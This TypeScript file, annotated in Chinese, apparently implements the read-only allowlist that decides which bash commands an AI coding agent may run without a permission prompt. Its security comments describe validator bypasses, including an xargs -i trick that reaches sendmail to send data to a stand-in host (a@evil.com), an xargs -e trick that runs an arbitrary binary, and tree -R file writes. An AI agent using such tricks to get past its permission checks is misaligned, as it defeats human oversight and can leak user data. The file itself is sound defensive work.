/**
 * 【一句话定位】判断一条 bash 命令是不是**只读**的（不写文件、不执行代码、不发网络请求）。
 *   是只读就可以免询问直接放行；判断不了就交回给其它权限环节。
 *   这是整个 BashTool 目录里最大的一张「规则表 + 解析器」。
 *
 * 【在架构中的位置】
 *   上游：BashTool.tsx 的权限链（checkReadOnlyConstraints）
 *   下游：utils/shell/readOnlyCommandValidation.js（共享的规则表与 validateFlags 实现：
 *        GIT_READ_ONLY_COMMANDS / GH_READ_ONLY_COMMANDS / RIPGREP_READ_ONLY_COMMANDS /
 *        DOCKER_READ_ONLY_COMMANDS / PYRIGHT_READ_ONLY_COMMANDS / EXTERNAL_READONLY_COMMANDS /
 *        containsVulnerableUncPath）、bashSecurity.js（bashCommandIsSafe_DEPRECATED 兜底）、
 *        bashPermissions.js（isNormalizedGitCommand）、pathValidation.js（PATH_EXTRACTORS 等）、
 *        sedValidation.js、utils/git.js（是否裸仓库）、utils/sandbox、bootstrap/state.js
 *   调用链：BashTool.hasPermission -> checkReadOnlyConstraints -> isCommandReadOnly
 *            -> isCommandSafeViaFlagParsing（白名单表） 或 READONLY_COMMAND_REGEXES（正则表）
 *
 * 【本文件包含什么】
 *   - CommandConfig：单条命令的配置形状（安全 flag 表 + 可选正则 + 可选回调 + 是否尊重 --）
 *   - FD_SAFE_FLAGS：fd / fdfind 共用的安全 flag 表
 *   - COMMAND_ALLOWLIST：白名单总表（xargs / git 系列 / file / sed / sort / man / help /
 *     netstat / ps / base64 / grep / rg / sha*sum / tree / date / hostname / info / lsof /
 *     pgrep / tput / ss / fd 等）
 *   - ANT_ONLY_COMMAND_ALLOWLIST：仅内部环境可用的表（gh 系列、aki——它们会发网络请求）
 *   - getCommandAllowlist()：按平台/环境组装出实际生效的表
 *   - SAFE_TARGET_COMMANDS_FOR_XARGS：允许作为 xargs 目标命令的安全命令
 *   - isCommandSafeViaFlagParsing()：**基于白名单表的判定**（推荐路径）
 *   - makeRegexForSafeCommand() / READONLY_COMMANDS / READONLY_COMMAND_REGEXES：正则兜底表
 *   - containsUnquotedExpansion()：检查「引号外」的通配符与变量展开
 *   - isCommandReadOnly()：单条命令的只读判定主逻辑
 *   - commandHasAnyGit() / GIT_INTERNAL_PATTERNS / isGitInternalPath() /
 *     extractWritePathsFromSubcommand() / commandWritesToGitInternalPaths()：git 沙箱逃逸防护
 *   - checkReadOnlyConstraints()：对外主入口
 *
 * 【规则分类逻辑：到底什么算「只读」】（理解本目录的关键）
 *   判定为只读必须同时满足三条：① 不写文件 ② 不执行代码 ③ 不发网络请求。
 *   于是命令被分成三类处理：
 *   ① 白名单表（COMMAND_ALLOWLIST）：逐个 flag 登记，只放行「确实只读」的 flag。
 *      凡是能写文件的 flag（如 tree -o、info -o、find -fprint）一律**不登记**——不登记就等于禁止
 *   ② 简单命令正则表（READONLY_COMMANDS + READONLY_COMMAND_REGEXES）：
 *      这些命令本身没有任何危险 flag（cat/head/wc/id/pwd 等），用一条「禁止 shell 元字符」的正则兜住即可
 *   ③ 特殊命令走自定义回调：date（位置参数可能改系统时间）、hostname（位置参数会改主机名）、
 *      ps（BSD 式 e 参数会泄露环境变量）、tput（init/reset 会执行终端初始化程序）、
 *      lsof（+m 会写文件）、sed（委托给 sedValidation）
 *   另外还有三条**跨命令**的红线：含 $ 变量（运行时才知值）、含未加引号的通配符、
 *   以及 git 相关的三类沙箱逃逸组合（cd+git、裸仓库、写入 git 内部文件后再跑 git）
 *
 * 【TS 语法速查】（本文件实际出现的）
 *   - `Record<string, FlagArgType>` ≈ Map<String, X>，键是 flag 字符串，值是「这个 flag 吃什么类型的参数」
 *   - `{ ...A, ...B }` 对象/数组展开：把另一张表的内容合并进来（不可变更新的典型写法）
 *   - `const { xargs: _, ...rest } = obj`：解构时把某个字段丢掉（_ 是「不要这个字段」的惯用名）
 *   - `(t): t is string => typeof t === 'string'` 类型谓词 ≈ instanceof 模式匹配，用于 filter 后收窄类型
 *   - `Object.entries(obj)`：把对象转成 [键, 值] 数组再遍历（≈ Java 的 map.entrySet()）
 *   - `new Set([...])` / `set.has(x)` ≈ HashSet
 *   - `??` 空值合并、`?.` 可选链、`!` 非空断言：分别对应兜默认值 / null 检查 / 强制转换
 *   - `Array.prototype.some/every` ≈ stream().anyMatch/allMatch
 *   - 类型标注在变量名**后面**，Java 在前面
 */
import type { z } from 'zod/v4'
import { getOriginalCwd } from '../../bootstrap/state.js'
import {
  extractOutputRedirections,
  splitCommand_DEPRECATED,
} from '../../utils/bash/commands.js'
import { tryParseShellCommand } from '../../utils/bash/shellQuote.js'
import { getCwd } from '../../utils/cwd.js'
import { isCurrentDirectoryBareGitRepo } from '../../utils/git.js'
import type { PermissionResult } from '../../utils/permissions/PermissionResult.js'
import { getPlatform } from '../../utils/platform.js'
import { SandboxManager } from '../../utils/sandbox/sandbox-adapter.js'
import {
  containsVulnerableUncPath,
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  type FlagArgType,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  PYRIGHT_READ_ONLY_COMMANDS,
  RIPGREP_READ_ONLY_COMMANDS,
  validateFlags,
} from '../../utils/shell/readOnlyCommandValidation.js'
import type { BashTool } from './BashTool.js'
import { isNormalizedGitCommand } from './bashPermissions.js'
import { bashCommandIsSafe_DEPRECATED } from './bashSecurity.js'
import {
  COMMAND_OPERATION_TYPE,
  PATH_EXTRACTORS,
  type PathCommand,
} from './pathValidation.js'
import { sedCommandIsAllowedByAllowlist } from './sedValidation.js'

// Unified command validation configuration system
// 一张「命令该怎么审」的配置单。设计成声明式（配置优先于代码）的好处：
//   新增一个命令只需往表里加一段配置，不用再写一套 if/else；审计时也只需看表
type CommandConfig = {
  // A Record mapping from the command (e.g. `xargs` or `git diff`) to its safe flags and the values they accept
  safeFlags: Record<string, FlagArgType>
  // An optional regex that is used for additional validation beyond flag parsing
  regex?: RegExp
  // An optional callback for additional custom validation logic. Returns true if the command is dangerous,
  // false if it appears to be safe. Meant to be used in conjunction with the safeFlags-based validation.
  additionalCommandIsDangerousCallback?: (
    rawCommand: string,
    args: string[],
  ) => boolean
  // When false, the tool does NOT respect POSIX `--` end-of-options.
  // 中文补充：绝大多数工具遇到 `--` 之后就不再解析 flag 了；但也有例外（如 macOS 的 base64），
  //   所以要把这个差异显式配置出来，否则攻击者可以用 `--` 把危险 flag 藏过去
  // validateFlags will continue checking flags after `--` instead of breaking.
  // Default: true (most tools respect `--`).
  respectsDoubleDash?: boolean
}

// Shared safe flags for fd and fdfind (Debian/Ubuntu package name)
// SECURITY: -x/--exec and -X/--exec-batch are deliberately excluded —
// 中文补充：fd 的 -x / -X 会对**每一个搜索结果**执行一条命令，等于把「搜索」变成了「执行命令」，
//   所以绝不能登记进安全 flag 表（不登记 = 禁止）
// they execute arbitrary commands for each search result.
// fd（以及 Debian 上的 fdfind）的安全 flag 表。注意这里的「值」不是随便写的：
//   'none' = 该 flag 不带参数；'number' = 必须是数字；'string' = 会吃掉下一个参数；
//   validateFlags 会按这个类型去校验并正确地「吃掉」后续 token
const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
  '-h': 'none',
  '--help': 'none',
  '-V': 'none',
  '--version': 'none',
  '-H': 'none',
  '--hidden': 'none',
  '-I': 'none',
  '--no-ignore': 'none',
  '--no-ignore-vcs': 'none',
  '--no-ignore-parent': 'none',
  '-s': 'none',
  '--case-sensitive': 'none',
  '-i': 'none',
  '--ignore-case': 'none',
  '-g': 'none',
  '--glob': 'none',
  '--regex': 'none',
  '-F': 'none',
  '--fixed-strings': 'none',
  '-a': 'none',
  '--absolute-path': 'none',
  // SECURITY: -l/--list-details EXCLUDED — internally executes `ls` as subprocess (same
  // 中文补充：-l 会在内部起一个 ls 子进程；若 PATH 上有恶意的 ls，就会被劫持执行（PATH 劫持风险）
  // pathway as --exec-batch). PATH hijacking risk if malicious `ls` is on PATH.
  '-L': 'none',
  '--follow': 'none',
  '-p': 'none',
  '--full-path': 'none',
  '-0': 'none',
  '--print0': 'none',
  '-d': 'number',
  '--max-depth': 'number',
  '--min-depth': 'number',
  '--exact-depth': 'number',
  '-t': 'string',
  '--type': 'string',
  '-e': 'string',
  '--extension': 'string',
  '-S': 'string',
  '--size': 'string',
  '--changed-within': 'string',
  '--changed-before': 'string',
  '-o': 'string',
  '--owner': 'string',
  '-E': 'string',
  '--exclude': 'string',
  '--ignore-file': 'string',
  '-c': 'string',
  '--color': 'string',
  '-j': 'number',
  '--threads': 'number',
  '--max-buffer-time': 'string',
  '--max-results': 'number',
  '-1': 'none',
  '-q': 'none',
  '--quiet': 'none',
  '--show-errors': 'none',
  '--strip-cwd-prefix': 'none',
  '--one-file-system': 'none',
  '--prune': 'none',
  '--search-path': 'string',
  '--base-directory': 'string',
  '--path-separator': 'string',
  '--batch-size': 'number',
  '--no-require-git': 'none',
  '--hyperlink': 'string',
  '--and': 'string',
  '--format': 'string',
}

// Central configuration for allowlist-based command validation
// All commands and flags here should only allow reading files. They should not
// allow writing to files, executing code, or creating network requests.
// 白名单总表。**登记原则**：只登记确认只读的 flag；所有能写文件、执行代码、发网络请求的 flag
//   一律不登记——「不在表里」本身就是拒绝（这种设计叫白名单，比黑名单安全得多）
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  // xargs 是最危险的一类：它把输入变成**另一条命令的参数**，天然就是「数据变代码」的桥梁，
  //   所以它的 flag 处理要格外小心（见下面 -i / -e 的注释）
  xargs: {
    safeFlags: {
      '-I': '{}',
      // SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
      // 中文详解（一个真实的绕过案例）：
      //   GNU xargs 里 -i 和 -e 的参数是「**可选且必须连写**」的（-iX 有效，`-i X` 表示 -i 不带参数、
      //   而 X 变成下一个位置参数即目标命令）。校验器和 GNU 实际行为不一致，于是：
      //     `echo /usr/sbin/sendm | xargs -it tail a@evil.com`
      //   校验器认为：两个都是不带参数的 flag，tail 是安全目标 → 放行；
      //   GNU 实际执行：replace-str=t，于是调用 /usr/sbin/sendmail → 变成外发邮件（数据泄露 + 命令执行）。
      //   结论：只用大写 -I（强制带参数）和 -E，让校验器与 GNU 的「参数消耗」完全一致
      // optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
      // attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
      // flag takes NO arg and `X` becomes the next positional (target command).
      //
      // `-i` (`i::` — optional replace-str):
      //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
      //   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
      //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
      //
      // `-e` (`e::` — optional eof-str):
      //   cat data | xargs -e EOF echo foo
      //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
      //   GNU: -e no attached arg → no eof-str, 'EOF' is the TARGET COMMAND
      //   → executes binary named EOF from PATH → CODE EXEC (malicious repo)
      //
      // Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
      // arg) instead — both validator and xargs agree on argument consumption.
      // `-i`/`-e` are deprecated (GNU: "use -I instead" / "use -E instead").
      '-n': 'number',
      '-P': 'number',
      '-L': 'number',
      '-s': 'number',
      '-E': 'EOF', // POSIX, MANDATORY separate arg — validator & xargs agree
      '-0': 'none',
      '-t': 'none',
      '-r': 'none',
      '-x': 'none',
      '-d': 'char',
    },
  },
  // All git read-only commands from shared validation map
  ...GIT_READ_ONLY_COMMANDS,
  file: {
    safeFlags: {
      // Output format flags
      '--brief': 'none',
      '-b': 'none',
      '--mime': 'none',
      '-i': 'none',
      '--mime-type': 'none',
      '--mime-encoding': 'none',
      '--apple': 'none',
      // Behavior flags
      '--check-encoding': 'none',
      '-c': 'none',
      '--exclude': 'string',
      '--exclude-quiet': 'string',
      '--print0': 'none',
      '-0': 'none',
      '-f': 'string',
      '-F': 'string',
      '--separator': 'string',
      '--help': 'none',
      '--version': 'none',
      '-v': 'none',
      // Following/dereferencing
      '--no-dereference': 'none',
      '-h': 'none',
      '--dereference': 'none',
      '-L': 'none',
      // Magic file options (safe when just reading)
      '--magic-file': 'string',
      '-m': 'string',
      // Other safe options
      '--keep-going': 'none',
      '-k': 'none',
      '--list': 'none',
      '-l': 'none',
      '--no-buffer': 'none',
      '-n': 'none',
      '--preserve-date': 'none',
      '-p': 'none',
      '--raw': 'none',
      '-r': 'none',
      '-s': 'none',
      '--special-files': 'none',
      // Uncompress flag for archives
      '--uncompress': 'none',
      '-z': 'none',
    },
  },
  // sed 的安全 flag 表 + 一个回调：最终是否安全交给 sedValidation 的 allowlist 去判
  sed: {
    safeFlags: {
      // Expression flags
      '--expression': 'string',
      '-e': 'string',
      // Output control
      '--quiet': 'none',
      '--silent': 'none',
      '-n': 'none',
      // Extended regex
      '--regexp-extended': 'none',
      '-r': 'none',
      '--posix': 'none',
      '-E': 'none',
      // Line handling
      '--line-length': 'number',
      '-l': 'number',
      '--zero-terminated': 'none',
      '-z': 'none',
      '--separate': 'none',
      '-s': 'none',
      '--unbuffered': 'none',
      '-u': 'none',
      // Debugging/help
      '--debug': 'none',
      '--help': 'none',
      '--version': 'none',
    },
    additionalCommandIsDangerousCallback: (
      rawCommand: string,
      _args: string[],
    // 回调返回 true 表示「危险」。这里直接复用 sed 专用的校验器，避免两套标准不一致
    ) => !sedCommandIsAllowedByAllowlist(rawCommand),
  },
  sort: {
    safeFlags: {
      // Sorting options
      '--ignore-leading-blanks': 'none',
      '-b': 'none',
      '--dictionary-order': 'none',
      '-d': 'none',
      '--ignore-case': 'none',
      '-f': 'none',
      '--general-numeric-sort': 'none',
      '-g': 'none',
      '--human-numeric-sort': 'none',
      '-h': 'none',
      '--ignore-nonprinting': 'none',
      '-i': 'none',
      '--month-sort': 'none',
      '-M': 'none',
      '--numeric-sort': 'none',
      '-n': 'none',
      '--random-sort': 'none',
      '-R': 'none',
      '--reverse': 'none',
      '-r': 'none',
      '--sort': 'string',
      '--stable': 'none',
      '-s': 'none',
      '--unique': 'none',
      '-u': 'none',
      '--version-sort': 'none',
      '-V': 'none',
      '--zero-terminated': 'none',
      '-z': 'none',
      // Key specifications
      '--key': 'string',
      '-k': 'string',
      '--field-separator': 'string',
      '-t': 'string',
      // Checking
      '--check': 'none',
      '-c': 'none',
      '--check-char-order': 'none',
      '-C': 'none',
      // Merging
      '--merge': 'none',
      '-m': 'none',
      // Buffer size
      '--buffer-size': 'string',
      '-S': 'string',
      // Parallel processing
      '--parallel': 'number',
      // Batch size
      '--batch-size': 'number',
      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  // man 之所以要登记而不是当普通命令放行：它有 -P（指定分页程序）这类能执行任意命令的 flag
  man: {
    safeFlags: {
      // Safe display options
      '-a': 'none', // Display all manual pages
      '--all': 'none', // Same as -a
      '-d': 'none', // Debug mode
      '-f': 'none', // Emulate whatis
      '--whatis': 'none', // Same as -f
      '-h': 'none', // Help
      '-k': 'none', // Emulate apropos
      '--apropos': 'none', // Same as -k
      '-l': 'string', // Local file (safe for reading, Linux only)
      '-w': 'none', // Display location instead of content

      // Safe formatting options
      '-S': 'string', // Restrict manual sections
      '-s': 'string', // Same as -S for whatis/apropos mode
    },
  },
  // help command - only allow bash builtin help flags to prevent attacks when
  // 中文补充：某些 shell 配置（如 oh-my-zsh 的 common-aliases）会把 help 别名成 man，
  //   而 man -P 可以执行任意命令。所以这里只放行 bash 内建 help 的三个无害 flag
  // help is aliased to man (e.g., in oh-my-zsh common-aliases plugin).
  // man's -P flag allows arbitrary command execution via pager.
  help: {
    safeFlags: {
      '-d': 'none', // Output short description for each topic
      '-m': 'none', // Display usage in pseudo-manpage format
      '-s': 'none', // Output only a short usage synopsis
    },
  },
  netstat: {
    safeFlags: {
      // Safe display options
      '-a': 'none', // Show all sockets
      '-L': 'none', // Show listen queue sizes
      '-l': 'none', // Print full IPv6 address
      '-n': 'none', // Show network addresses as numbers

      // Safe filtering options
      '-f': 'string', // Address family (inet, inet6, unix, vsock)

      // Safe interface options
      '-g': 'none', // Show multicast group membership
      '-i': 'none', // Show interface state
      '-I': 'string', // Specific interface

      // Safe statistics options
      '-s': 'none', // Show per-protocol statistics

      // Safe routing options
      '-r': 'none', // Show routing tables

      // Safe mbuf options
      '-m': 'none', // Show memory management statistics

      // Safe other options
      '-v': 'none', // Increase verbosity
    },
  },
  // ps 的风险点：BSD 风格的 e 参数（如 `ps axe`）会显示所有进程的**环境变量**，可能泄露密钥
  ps: {
    safeFlags: {
      // UNIX-style process selection (these are safe)
      '-e': 'none', // Select all processes
      '-A': 'none', // Select all processes (same as -e)
      '-a': 'none', // Select all with tty except session leaders
      '-d': 'none', // Select all except session leaders
      '-N': 'none', // Negate selection
      '--deselect': 'none',

      // UNIX-style output format (safe, doesn't show env)
      '-f': 'none', // Full format
      '-F': 'none', // Extra full format
      '-l': 'none', // Long format
      '-j': 'none', // Jobs format
      '-y': 'none', // Don't show flags

      // Output modifiers (safe ones)
      '-w': 'none', // Wide output
      '-ww': 'none', // Unlimited width
      '--width': 'number',
      '-c': 'none', // Show scheduler info
      '-H': 'none', // Show process hierarchy
      '--forest': 'none',
      '--headers': 'none',
      '--no-headers': 'none',
      '-n': 'string', // Set namelist file
      '--sort': 'string',

      // Thread display
      '-L': 'none', // Show threads
      '-T': 'none', // Show threads
      '-m': 'none', // Show threads after processes

      // Process selection by criteria
      '-C': 'string', // By command name
      '-G': 'string', // By real group ID
      '-g': 'string', // By session or effective group
      '-p': 'string', // By PID
      '--pid': 'string',
      '-q': 'string', // Quick mode by PID
      '--quick-pid': 'string',
      '-s': 'string', // By session ID
      '--sid': 'string',
      '-t': 'string', // By tty
      '--tty': 'string',
      '-U': 'string', // By real user ID
      '-u': 'string', // By effective user ID
      '--user': 'string',

      // Help/version
      '--help': 'none',
      '--info': 'none',
      '-V': 'none',
      '--version': 'none',
    },
    // Block BSD-style 'e' modifier which shows environment variables
    // 中文补充：BSD 风格的选项是「不带前导横杠、纯字母」的 token（如 axe），
    //   所以判定方法是：不含 - 开头、且纯字母里含 e ——注意要和 UNIX 风格的 -e（选所有进程）区分开
    // BSD options are letter-only tokens without a leading dash
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // Check for BSD-style 'e' in letter-only tokens (not -e which is UNIX-style)
      // A BSD-style option is a token of only letters (no leading dash) containing 'e'
      return args.some(
        a => !a.startsWith('-') && /^[a-zA-Z]*e[a-zA-Z]*$/.test(a),
      )
    },
  },
  // base64 只做编解码，本身安全；但它带 -i/--input 可以读文件（读不算危险，路径由 pathValidation 另行校验）
  base64: {
    // macOS 版 base64 不认 -- 结束符，所以校验时不能因为遇到 -- 就停止检查后面的 flag
    respectsDoubleDash: false, // macOS base64 does not respect POSIX --
    safeFlags: {
      // Safe decode options
      '-d': 'none', // Decode
      '-D': 'none', // Decode (macOS)
      '--decode': 'none', // Decode

      // Safe formatting options
      '-b': 'number', // Break lines at num (macOS)
      '--break': 'number', // Break lines at num (macOS)
      '-w': 'number', // Wrap lines at COLS (Linux)
      '--wrap': 'number', // Wrap lines at COLS (Linux)

      // Safe input options (read from file, not write)
      '-i': 'string', // Input file (safe for reading)
      '--input': 'string', // Input file (safe for reading)

      // Safe misc options
      '--ignore-garbage': 'none', // Ignore non-alphabet chars when decoding (Linux)
      '-h': 'none', // Help
      '--help': 'none', // Help
      '--version': 'none', // Version
    },
  },
  // grep 的 flag 很多，但只要不影响「只读」性质（都是控制匹配方式/输出格式）就可以登记
  grep: {
    safeFlags: {
      // Pattern flags
      '-e': 'string', // Pattern
      '--regexp': 'string',
      '-f': 'string', // File with patterns
      '--file': 'string',
      '-F': 'none', // Fixed strings
      '--fixed-strings': 'none',
      '-G': 'none', // Basic regexp (default)
      '--basic-regexp': 'none',
      '-E': 'none', // Extended regexp
      '--extended-regexp': 'none',
      '-P': 'none', // Perl regexp
      '--perl-regexp': 'none',

      // Matching control
      '-i': 'none', // Ignore case
      '--ignore-case': 'none',
      '--no-ignore-case': 'none',
      '-v': 'none', // Invert match
      '--invert-match': 'none',
      '-w': 'none', // Word regexp
      '--word-regexp': 'none',
      '-x': 'none', // Line regexp
      '--line-regexp': 'none',

      // Output control
      '-c': 'none', // Count
      '--count': 'none',
      '--color': 'string',
      '--colour': 'string',
      '-L': 'none', // Files without match
      '--files-without-match': 'none',
      '-l': 'none', // Files with matches
      '--files-with-matches': 'none',
      '-m': 'number', // Max count
      '--max-count': 'number',
      '-o': 'none', // Only matching
      '--only-matching': 'none',
      '-q': 'none', // Quiet
      '--quiet': 'none',
      '--silent': 'none',
      '-s': 'none', // No messages
      '--no-messages': 'none',

      // Output line prefix
      '-b': 'none', // Byte offset
      '--byte-offset': 'none',
      '-H': 'none', // With filename
      '--with-filename': 'none',
      '-h': 'none', // No filename
      '--no-filename': 'none',
      '--label': 'string',
      '-n': 'none', // Line number
      '--line-number': 'none',
      '-T': 'none', // Initial tab
      '--initial-tab': 'none',
      '-u': 'none', // Unix byte offsets
      '--unix-byte-offsets': 'none',
      '-Z': 'none', // Null after filename
      '--null': 'none',
      '-z': 'none', // Null data
      '--null-data': 'none',

      // Context control
      '-A': 'number', // After context
      '--after-context': 'number',
      '-B': 'number', // Before context
      '--before-context': 'number',
      '-C': 'number', // Context
      '--context': 'number',
      '--group-separator': 'string',
      '--no-group-separator': 'none',

      // File and directory selection
      '-a': 'none', // Text (process binary as text)
      '--text': 'none',
      '--binary-files': 'string',
      '-D': 'string', // Devices
      '--devices': 'string',
      '-d': 'string', // Directories
      '--directories': 'string',
      '--exclude': 'string',
      '--exclude-from': 'string',
      '--exclude-dir': 'string',
      '--include': 'string',
      '-r': 'none', // Recursive
      '--recursive': 'none',
      '-R': 'none', // Dereference-recursive
      '--dereference-recursive': 'none',

      // Other options
      '--line-buffered': 'none',
      '-U': 'none', // Binary
      '--binary': 'none',

      // Help and version
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
    },
  },
  ...RIPGREP_READ_ONLY_COMMANDS,
  // Checksum commands - these only read files and compute/verify hashes
  // All flags are safe as they only affect output format or verification behavior
  sha256sum: {
    safeFlags: {
      // Mode flags
      '-b': 'none', // Binary mode
      '--binary': 'none',
      '-t': 'none', // Text mode
      '--text': 'none',

      // Check/verify flags
      '-c': 'none', // Verify checksums from file
      '--check': 'none',
      '--ignore-missing': 'none', // Ignore missing files during check
      '--quiet': 'none', // Quiet mode during check
      '--status': 'none', // Don't output, exit code shows success
      '--strict': 'none', // Exit non-zero for improperly formatted lines
      '-w': 'none', // Warn about improperly formatted lines
      '--warn': 'none',

      // Output format flags
      '--tag': 'none', // BSD-style output
      '-z': 'none', // End output lines with NUL
      '--zero': 'none',

      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  sha1sum: {
    safeFlags: {
      // Mode flags
      '-b': 'none', // Binary mode
      '--binary': 'none',
      '-t': 'none', // Text mode
      '--text': 'none',

      // Check/verify flags
      '-c': 'none', // Verify checksums from file
      '--check': 'none',
      '--ignore-missing': 'none', // Ignore missing files during check
      '--quiet': 'none', // Quiet mode during check
      '--status': 'none', // Don't output, exit code shows success
      '--strict': 'none', // Exit non-zero for improperly formatted lines
      '-w': 'none', // Warn about improperly formatted lines
      '--warn': 'none',

      // Output format flags
      '--tag': 'none', // BSD-style output
      '-z': 'none', // End output lines with NUL
      '--zero': 'none',

      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  md5sum: {
    safeFlags: {
      // Mode flags
      '-b': 'none', // Binary mode
      '--binary': 'none',
      '-t': 'none', // Text mode
      '--text': 'none',

      // Check/verify flags
      '-c': 'none', // Verify checksums from file
      '--check': 'none',
      '--ignore-missing': 'none', // Ignore missing files during check
      '--quiet': 'none', // Quiet mode during check
      '--status': 'none', // Don't output, exit code shows success
      '--strict': 'none', // Exit non-zero for improperly formatted lines
      '-w': 'none', // Warn about improperly formatted lines
      '--warn': 'none',

      // Output format flags
      '--tag': 'none', // BSD-style output
      '-z': 'none', // End output lines with NUL
      '--zero': 'none',

      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  // tree command - moved from READONLY_COMMAND_REGEXES to allow flags and path arguments
  // -o/--output writes to a file, so it's excluded. All other flags are display/filter options.
  // tree 从原来的「简单命令表」迁移到这里，因为它有些 flag 会写文件（见 -R 的注释）
  tree: {
    safeFlags: {
      // Listing options
      '-a': 'none', // All files
      '-d': 'none', // Directories only
      '-l': 'none', // Follow symlinks
      '-f': 'none', // Full path prefix
      '-x': 'none', // Stay on current filesystem
      '-L': 'number', // Max depth
      // SECURITY: -R REMOVED. tree -R combined with -H (HTML mode) and -L (depth)
      // 中文详解（很隐蔽的一个坑）：
      //   tree -R 的语义不是「重新列一遍」，而是「在每个子目录里再跑一次 tree，并加上 -o 00Tree.html」。
      //   这会在每个子目录下写出 00Tree.html 文件——一次调用写一堆文件，而且完全不带任何权限提示。
      //   手册里那句「Rerun at max depth」极具误导性，所以这里直接把 -R 从安全表里移除
      // WRITES 00Tree.html files to every subdirectory at the depth boundary.
      // From man tree (< 2.1.0): "-R — at each of them execute tree again
      // adding `-o 00Tree.html` as a new option." The comment "Rerun at max
      // depth" was misleading — the "rerun" includes a hardcoded -o file write.
      // `tree -R -H . -L 2 /path` → writes /path/<subdir>/00Tree.html for each
      // subdir at depth 2. FILE WRITE, zero permissions.
      '-P': 'string', // Include pattern
      '-I': 'string', // Exclude pattern
      '--gitignore': 'none',
      '--gitfile': 'string',
      '--ignore-case': 'none',
      '--matchdirs': 'none',
      '--metafirst': 'none',
      '--prune': 'none',
      '--info': 'none',
      '--infofile': 'string',
      '--noreport': 'none',
      '--charset': 'string',
      '--filelimit': 'number',
      // File display options
      '-q': 'none', // Non-printable as ?
      '-N': 'none', // Non-printable as-is
      '-Q': 'none', // Quote filenames
      '-p': 'none', // Protections
      '-u': 'none', // Owner
      '-g': 'none', // Group
      '-s': 'none', // Size bytes
      '-h': 'none', // Human-readable sizes
      '--si': 'none',
      '--du': 'none',
      '-D': 'none', // Last modification time
      '--timefmt': 'string',
      '-F': 'none', // Append indicator
      '--inodes': 'none',
      '--device': 'none',
      // Sorting options
      '-v': 'none', // Version sort
      '-t': 'none', // Sort by mtime
      '-c': 'none', // Sort by ctime
      '-U': 'none', // Unsorted
      '-r': 'none', // Reverse sort
      '--dirsfirst': 'none',
      '--filesfirst': 'none',
      '--sort': 'string',
      // Graphics/output options
      '-i': 'none', // No indentation lines
      '-A': 'none', // ANSI line graphics
      '-S': 'none', // CP437 line graphics
      '-n': 'none', // No color
      '-C': 'none', // Color
      '-X': 'none', // XML output
      '-J': 'none', // JSON output
      '-H': 'string', // HTML output with base HREF
      '--nolinks': 'none',
      '--hintro': 'string',
      '--houtro': 'string',
      '-T': 'string', // HTML title
      '--hyperlink': 'none',
      '--scheme': 'string',
      '--authority': 'string',
      // Input options (read from file, not write)
      '--fromfile': 'none',
      '--fromtabfile': 'none',
      '--fflinks': 'none',
      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  // date command - moved from READONLY_COMMANDS because -s/--set can set system time
  // Also -f/--file can be used to read dates from file and set time
  // We only allow safe display options
  // date 看似人畜无害，但：① -s 可以改系统时间；② 位置参数 MMDDhhmm 也会**设置系统时间**。
  //   所以除了 flag 白名单，还要用回调检查位置参数必须是以 + 开头的格式串
  date: {
    safeFlags: {
      // Display options (safe - don't modify system time)
      '-d': 'string', // --date=STRING - display time described by STRING
      '--date': 'string',
      '-r': 'string', // --reference=FILE - display file's modification time
      '--reference': 'string',
      '-u': 'none', // --utc - use UTC
      '--utc': 'none',
      '--universal': 'none',
      // Output format options
      '-I': 'none', // --iso-8601 (can have optional argument, but none type handles bare flag)
      '--iso-8601': 'string',
      '-R': 'none', // --rfc-email
      '--rfc-email': 'none',
      '--rfc-3339': 'string',
      // Debug/help
      '--debug': 'none',
      '--help': 'none',
      '--version': 'none',
    },
    // Dangerous flags NOT included (blocked by omission):
    // -s / --set - sets system time
    // -f / --file - reads dates from file (can be used to set time in batch)
    // CRITICAL: date positional args in format MMDDhhmm[[CC]YY][.ss] set system time
    // Use callback to verify positional args start with + (format strings like +"%Y-%m-%d")
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // args are already parsed tokens after "date"
      // Flags that require an argument
      const flagsWithArgs = new Set([
        '-d',
        '--date',
        '-r',
        '--reference',
        '--iso-8601',
        '--rfc-3339',
      ])
      let i = 0
      while (i < args.length) {
        const token = args[i]!
        // Skip flags and their arguments
        if (token.startsWith('--') && token.includes('=')) {
          // Long flag with =value, already consumed
          i++
        } else if (token.startsWith('-')) {
          // Flag - check if it takes an argument
          if (flagsWithArgs.has(token)) {
            i += 2 // Skip flag and its argument
          } else {
            i++ // Just skip the flag
          }
        } else {
          // Positional argument - must start with + for format strings
          // 中文补充：只有 `+"%Y-%m-%d"` 这种以 + 开头的格式串是安全的；
          //   任何其它形式的位置参数（如 12011200）都可能被解释成「设置系统时间」
          // Anything else (like MMDDhhmm) could set system time
          if (!token.startsWith('+')) {
            return true // Dangerous
          }
          i++
        }
      }
      return false // Safe
    },
  },
  // hostname command - moved from READONLY_COMMANDS because positional args set hostname
  // Also -F/--file sets hostname from file, -b/--boot sets default hostname
  // We only allow safe display options and BLOCK any positional arguments
  // hostname 不带参数是「显示主机名」，带位置参数则是「**设置**主机名」——所以要用正则把位置参数彻底堵死
  hostname: {
    safeFlags: {
      // Display options only (safe)
      '-f': 'none', // --fqdn - display FQDN
      '--fqdn': 'none',
      '--long': 'none',
      '-s': 'none', // --short - display short name
      '--short': 'none',
      '-i': 'none', // --ip-address
